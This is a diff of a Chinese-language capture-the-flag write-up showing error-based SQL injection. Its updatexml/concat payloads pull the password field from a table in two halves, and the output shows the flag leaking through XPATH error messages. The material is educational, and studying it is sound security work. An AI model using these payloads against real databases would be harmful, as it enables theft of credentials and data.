@@ -121,17 +121,17 @@ XPATH syntax error: '~id@,username@,password@~'
 
 #猜测flag内容在password字段里
 #==爆password数据==
-b'or(updatexml(1,concat(0x7e,(select`password`from`H4rDsq1`where`password`like('flag{%')),0x7e),1))# //注释掉%}
+b'or(updatexml(1,concat(0x7e,(select(left(password,25))from(H4rDsq1)),0x7e),1))#
 
 #==回显结果==
-XPATH syntax error: '~flag{b4541970-14a3-4581-ae1f-30'
+XPATH syntax error: '~flag{feae3b3c-198d-4bce-9~'
 
 #发现只有一半的flag，所以还需要
 #==爆破==
-b'or(updatexml(1,concat(0x7e,right((select`password`from`H4rDsq1`where`password`like('flag{%')),30),0x7e),1))# //注释掉%}
+b'or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))#
 
 #==回显结果==
-XPATH syntax error: '~0-14a3-4581-ae1f-303399d179f8}~'
+XPATH syntax error: '~d-4bce-9c93-76903e057e78}~'
 ```
 
 这题的主要知识点就是利用`updatexml()`和`extractvalue()`函数进行报错注入。使用`concat()`函数，再加上`~`或者`@`等能够引起路径参数报错的字符，将形如`concat(0x7e, 语句, 0x7e)`这样的结果作为参数，就能够得到`XPATH syntax error: '回显结果'`这样的报错信息，实现注入。
